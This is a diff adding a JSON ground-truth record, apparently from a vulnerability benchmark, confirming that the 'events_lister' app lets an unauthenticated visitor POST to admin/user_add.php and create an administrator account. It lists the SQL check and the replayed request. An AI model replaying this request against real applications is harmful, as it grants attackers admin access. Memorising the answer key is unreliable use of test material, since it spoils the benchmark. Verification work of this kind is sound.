@@ -1,0 +1,29 @@
+{
+  "gt_id": "GT-028",
+  "app": "events_lister",
+  "verified_at": "2026-09-06T04:58:05.565300+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST admin/user_add.php returned 200; a new administrator account row (id=4, uname=DRHLGT_addadmin_8670685443@example.test) was created without any login (created=True).",
+  "sql_statements": [
+    {
+      "kind": "scalar",
+      "sql": "SELECT id FROM admin WHERE uname='DRHLGT_addadmin_8670685443@example.test' LIMIT 1"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "admin",
+      "token_email": "DRHLGT_addadmin_8670685443@example.test"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST admin/user_add.php uname=<token>@example.test",
+      "status_code": 200,
+      "admin_row_created_id": "4",
+      "created": true,
+      "body_saved": "GT-028_gt028_visitor_user_add.html"
+    }
+  ]
+}
